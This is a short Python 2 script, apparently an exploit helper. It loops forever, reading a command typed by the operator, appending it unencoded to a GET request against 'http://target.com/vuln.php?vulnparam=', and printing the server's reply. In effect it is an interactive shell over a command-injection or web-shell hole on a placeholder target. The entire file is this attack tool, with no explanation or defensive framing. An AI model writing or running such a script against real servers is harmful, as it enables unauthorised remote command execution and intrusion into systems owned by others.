import requests

while True:
    cmd=raw_input("> ")
    r = requests.get("http://target.com/vuln.php?vulnparam="+cmd)
    print r.content
